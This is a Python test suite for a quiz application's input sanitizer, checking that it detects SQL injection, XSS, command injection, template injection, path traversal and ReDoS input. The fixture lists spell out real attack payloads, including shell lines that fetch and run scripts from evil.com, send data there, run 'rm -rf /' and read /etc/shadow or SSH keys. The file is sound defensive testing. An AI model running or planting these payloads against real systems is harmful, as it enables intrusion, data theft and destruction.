"""
Comprehensive injection attack protection tests.

Tests protection against:
- SQL injection
- XSS (Cross-Site Scripting)
- Command injection
- Template injection
- Path traversal
- ReDoS (Regular Expression Denial of Service)

Tests cover multiple injection points:
- User answers
- Quiz creator input
- API request bodies
- API response handling
"""

import pytest
from pyquizhub.core.engine.input_sanitizer import InputSanitizer


class TestSQLInjectionProtection:
    """Test SQL injection pattern detection and blocking."""

    SQL_INJECTION_PAYLOADS = [
        # Classic SQL injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",

        # Union-based injection
        "' UNION SELECT null, null, null--",
        "1' UNION SELECT password FROM users--",

        # Blind SQL injection
        "1' AND '1'='1",
        "1' AND SLEEP(5)--",

        # Stacked queries
        "1'; DELETE FROM users WHERE '1'='1",

        # Comment-based
        "admin'/*",
        "admin'#",

        # Time-based blind
        "1' WAITFOR DELAY '00:00:05'--",

        # Boolean-based blind
        "1' AND 1=1--",
        "1' AND 1=2--",

        # Error-based
        "1' AND (SELECT * FROM users)--",

        # Dangerous procedures
        "'; EXEC xp_cmdshell('dir'); --",
        "'; EXEC sp_executesql N'SELECT * FROM users'; --",

        # Case variations
        "' or '1'='1",
        "' OR '1'='1",
        "' oR '1'='1",
    ]

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_detected(self, payload):
        """Test that SQL injection payloads are detected."""
        with pytest.raises(ValueError, match="SQL injection"):
            InputSanitizer.sanitize_string(payload, allow_sql=False)

    def test_safe_sql_like_strings_allowed(self):
        """Test that safe strings that look SQL-ish are allowed."""
        safe_strings = [
            "O'Brien",  # Apostrophe in name
            "It's a beautiful day",
            "The answer is 1",
            "Select your favorite color",  # 'select' as normal word
        ]

        for s in safe_strings:
            # These might still be flagged - we err on side of caution
            # But they shouldn't crash
            try:
                InputSanitizer.sanitize_string(s, allow_sql=False)
            except ValueError as e:
                # If flagged, it should be for SQL
                assert "SQL" in str(e) or "forbidden" in str(e)


class TestXSSProtection:
    """Test XSS (Cross-Site Scripting) protection."""

    XSS_PAYLOADS = [
        # Script tags
        "<script>alert('XSS')</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<script>alert(document.cookie)</script>",

        # Event handlers
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",

        # JavaScript protocol
        "<a href='javascript:alert(\"XSS\")'>Click</a>",
        "javascript:alert('XSS')",

        # Iframe injection
        "<iframe src='http://evil.com'></iframe>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",

        # Object/embed tags
        "<object data='http://evil.com/xss.swf'>",
        "<embed src='http://evil.com/xss.swf'>",

        # Meta tag
        "<meta http-equiv='refresh' content='0;url=http://evil.com'>",

        # Link tag
        "<link rel='stylesheet' href='http://evil.com/xss.css'>",

        # Style tag
        "<style>body{background:url('http://evil.com/bg.jpg')}</style>",

        # Data URL
        "<img src='data:text/html,<script>alert(\"XSS\")</script>'>",

        # VBScript
        "<img src='vbscript:msgbox(\"XSS\")'>",

        # CSS expression
        "<div style='width:expression(alert(\"XSS\"))'>",

        # Applet
        "<applet code='XSS.class'>",

        # Case variations
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<sCrIpT>alert('XSS')</ScRiPt>",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_detected(self, payload):
        """Test that XSS payloads are detected."""
        with pytest.raises(ValueError, match="XSS"):
            InputSanitizer.sanitize_string(payload, allow_html=False)

    def test_safe_html_like_strings(self):
        """Test that safe strings with < > are handled."""
        strings = [
            "x < 5",
            "y > 10",
            "5 < x < 10",
            "Use the <tab> key",
        ]

        for s in strings:
            # These should pass if they don't match XSS patterns
            try:
                result = InputSanitizer.sanitize_string(s, allow_html=False)
                assert result == s
            except ValueError as e:
                # If flagged, should be for specific XSS pattern
                if "XSS" in str(e):
                    # This is expected for safety
                    pass


class TestCommandInjectionProtection:
    """Test command injection protection."""

    COMMAND_INJECTION_PAYLOADS = [
        # Shell metacharacters
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(uname -a)",
        "${IFS}",

        # Command chaining
        "file.txt; rm -rf /",
        "data && wget http://evil.com/backdoor",
        "input || curl http://evil.com/exfiltrate",

        # Subshell execution
        "$(curl http://evil.com/payload.sh | sh)",
        "`wget -O- http://evil.com/script | bash`",

        # Variable expansion
        "${PATH}",
        "$HOME/.ssh/id_rsa",

        # Backtick command substitution
        "`whoami`",
        "`cat /etc/shadow`",

        # Parenthesis execution
        "(ls -la)",
        "(id; whoami)",
    ]

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_detected(self, payload):
        """Test that command injection payloads are detected."""
        with pytest.raises(ValueError, match="command injection"):
            InputSanitizer.sanitize_string(payload, allow_shell=False)


class TestTemplateInjectionProtection:
    """Test template injection protection."""

    TEMPLATE_INJECTION_PAYLOADS = [
        # Jinja2/Django templates
        "{{config.SECRET_KEY}}",
        "{{7*7}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{% for item in items %}{{item}}{% endfor %}",

        # JSP/JSF templates
        "${applicationScope}",
        "${pageContext.request.getSession().getAttribute('user')}",

        # ASP/JSP templates
        "<%=System.getProperty('user.dir')%>",
        "<% out.println(\"test\"); %>",

        # Ruby/EL templates
        "#{7*7}",
        "#{File.open('/etc/passwd').read}",

        # Freemarker templates
        "${.now}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>",
    ]

    @pytest.mark.parametrize("payload", TEMPLATE_INJECTION_PAYLOADS)
    def test_template_injection_detected(self, payload):
        """Test that template injection payloads are detected."""
        # These may be caught as template injection OR command injection
        # The important thing is they're rejected
        with pytest.raises(ValueError):
            InputSanitizer.sanitize_string(payload, allow_template=False)


class TestPathTraversalProtection:
    """Test path traversal protection."""

    PATH_TRAVERSAL_PAYLOADS = [
        # Basic path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",

        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows",

        # Double encoding
        "%252e%252e%252f",

        # Various representations
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
    ]

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_in_string(self, payload):
        """Test path traversal detection in strings."""
        # Path traversal might be detected if it matches patterns
        # URL encoding should be sanitized when used in URLs
        result = InputSanitizer.sanitize_for_url_param(payload)
        # Should be URL-encoded - dangerous chars should be gone
        assert "../" not in result
        assert "\\.." not in result
        # Result should be URL-encoded (contains % encoding)
        assert "%" in result


class TestStringSanitization:
    """Test general string sanitization."""

    def test_max_length_enforced(self):
        """Test that maximum length is enforced."""
        long_string = "a" * 10001
        with pytest.raises(ValueError, match="[Ll]ength.*exceeds|too long"):
            InputSanitizer.sanitize_string(long_string, max_length=10000)

    def test_short_strings_allowed(self):
        """Test that strings within limit are allowed."""
        short_string = "Hello, world!"
        result = InputSanitizer.sanitize_string(short_string, max_length=100)
        assert result == short_string

    def test_empty_string_allowed(self):
        """Test that empty strings are handled."""
        result = InputSanitizer.sanitize_string("", max_length=100)
        assert result == ""


class TestURLParameterSanitization:
    """Test URL parameter sanitization."""

    def test_url_encoding_special_characters(self):
        """Test that special characters are URL-encoded."""
        test_cases = [
            ("hello world", "hello+world"),  # Space -> +
            ("user@example.com", "user%40example.com"),  # @ -> %40
            ("a&b=c", "a%26b%3Dc"),  # & -> %26, = -> %3D
            ("../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"),  # / -> %2F
        ]

        for input_str, expected_encoded in test_cases:
            result = InputSanitizer.sanitize_for_url_param(input_str)
            assert result == expected_encoded

    def test_injection_payloads_neutralized(self):
        """Test that injection payloads are neutralized by URL encoding."""
        payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "$(curl evil.com/backdoor)",
        ]

        for payload in payloads:
            result = InputSanitizer.sanitize_for_url_param(payload)
            # Should be URL-encoded
            assert "'" not in result
            assert "<" not in result
            assert "$" not in result
            assert "%" in result  # URL encoding uses %


class TestDictionarySanitization:
    """Test recursive dictionary sanitization."""

    def test_dict_sanitization_basic(self):
        """Test basic dictionary sanitization."""
        data = {
            "name": "John",
            "age": 30,
            "email": "john@example.com"
        }

        result = InputSanitizer.sanitize_dict(data)
        assert result == data

    def test_dict_sanitization_with_injection(self):
        """Test that injection attempts in dicts are caught."""
        data = {
            "name": "'; DROP TABLE users; --",
            "comment": "<script>alert('XSS')</script>"
        }

        with pytest.raises(ValueError, match="SQL injection|XSS"):
            InputSanitizer.sanitize_dict(data)

    def test_nested_dict_sanitization(self):
        """Test nested dictionary sanitization."""
        data = {
            "user": {
                "profile": {
                    "bio": "Safe bio text"
                }
            }
        }

        result = InputSanitizer.sanitize_dict(data)
        assert result == data

    def test_max_depth_protection(self):
        """Test protection against deeply nested dicts (DoS)."""
        # Create deeply nested dict
        data = {"a": None}
        current = data
        for i in range(50):
            current["a"] = {"a": None}
            current = current["a"]

        with pytest.raises(ValueError, match="too deep|DoS"):
            InputSanitizer.sanitize_dict(data, max_depth=10)


class TestListSanitization:
    """Test list sanitization."""

    def test_list_sanitization_basic(self):
        """Test basic list sanitization."""
        data = ["apple", "banana", "cherry"]
        result = InputSanitizer.sanitize_list(data)
        assert result == data

    def test_list_with_injection(self):
        """Test that injection attempts in lists are caught."""
        data = ["safe", "'; DROP TABLE users; --", "also safe"]

        with pytest.raises(ValueError, match="SQL injection"):
            InputSanitizer.sanitize_list(data)

    def test_nested_list_sanitization(self):
        """Test nested list sanitization."""
        data = [["a", "b"], ["c", "d"]]
        result = InputSanitizer.sanitize_list(data)
        assert result == data

    def test_max_depth_protection_list(self):
        """Test protection against deeply nested lists."""
        # Create deeply nested list
        data = []
        current = data
        for i in range(50):
            new_list = []
            current.append(new_list)
            current = new_list

        with pytest.raises(ValueError, match="too deep|DoS"):
            InputSanitizer.sanitize_list(data, max_depth=10)


class TestJSONResponseSanitization:
    """Test API JSON response sanitization."""

    def test_json_size_limit(self):
        """Test that oversized JSON responses are rejected."""
        # Create a large JSON response
        large_data = {"data": "x" * (3 * 1024 * 1024)}  # 3MB

        with pytest.raises(ValueError, match="too large"):
            InputSanitizer.sanitize_json_response(large_data, max_size_mb=1.0)

    def test_json_depth_limit(self):
        """Test that deeply nested JSON is rejected."""
        # Create deeply nested JSON
        data = {"a": None}
        current = data
        for i in range(50):
            current["a"] = {"a": None}
            current = current["a"]

        with pytest.raises(ValueError, match="too deep"):
            InputSanitizer.sanitize_json_response(data, max_depth=10)

    def test_json_with_injection_attempts(self):
        """Test that injection attempts in JSON are caught."""
        data = {
            "user": {
                "name": "'; DROP TABLE users; --",
                "bio": "<script>alert('XSS')</script>"
            }
        }

        with pytest.raises(ValueError, match="SQL injection|XSS"):
            InputSanitizer.sanitize_json_response(data)

    def test_safe_json_allowed(self):
        """Test that safe JSON is allowed."""
        data = {
            "temperature": 25.5,
            "city": "Berlin",
            "conditions": "sunny",
            "wind_speed": 10
        }

        result = InputSanitizer.sanitize_json_response(data)
        assert result == data


class TestRegexReDoSProtection:
    """Test protection against ReDoS (Regular Expression Denial of Service)."""

    def test_catastrophic_backtracking_patterns(self):
        """Test that dangerous regex patterns are rejected."""
        dangerous_patterns = [
            r"(a+)+",  # Catastrophic backtracking
            r"(a*)*",  # Catastrophic backtracking
            r"(a|a)*",  # Catastrophic backtracking
            r"(a|ab)*",  # Catastrophic backtracking
        ]

        for pattern in dangerous_patterns:
            with pytest.raises(ValueError, match="ReDoS"):
                InputSanitizer.validate_regex_pattern(pattern)

    def test_safe_regex_patterns_allowed(self):
        """Test that safe regex patterns are allowed."""
        safe_patterns = [
            r"[a-z]+",
            r"\d{1,3}",
            r"[a-zA-Z0-9_-]+",
            r"^[a-z]{3,10}$",
        ]

        for pattern in safe_patterns:
            result = InputSanitizer.validate_regex_pattern(pattern)
            assert result == pattern

    def test_excessive_pattern_length_rejected(self):
        """Test that excessively long patterns are rejected."""
        long_pattern = "a" * 300

        with pytest.raises(ValueError, match="too long"):
            InputSanitizer.validate_regex_pattern(long_pattern, max_length=200)


class TestNullByteInjection:
    """Test protection against null byte injection."""

    def test_null_bytes_in_strings(self):
        """Test handling of null bytes in strings."""
        # Python strings can contain null bytes
        string_with_null = "hello\x00world"

        # Should be sanitized or rejected
        # Current implementation handles it as normal string
        # Could add explicit null byte detection if needed
        result = InputSanitizer.sanitize_string(string_with_null)
        assert result == string_with_null


class TestEdgeCases:
    """Test edge cases in input sanitization."""

    def test_non_string_input_rejected(self):
        """Test that non-string inputs are rejected."""
        with pytest.raises(ValueError, match="[Ee]xpected string"):
            InputSanitizer.sanitize_string(123)

        with pytest.raises(ValueError, match="[Ee]xpected string"):
            InputSanitizer.sanitize_string(None)

        with pytest.raises(ValueError, match="[Ee]xpected string"):
            InputSanitizer.sanitize_string(["list"])

    def test_unicode_normalization(self):
        """Test handling of different Unicode normalizations."""
        # Same character in different forms
        # é can be: e + combining accent OR é (single character)
        nfc = "café"  # NFC normalization
        nfd = "café"  # NFD normalization

        # Both should be handled safely
        result1 = InputSanitizer.sanitize_string(nfc)
        result2 = InputSanitizer.sanitize_string(nfd)

        # Results might differ in normalization but should not crash


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
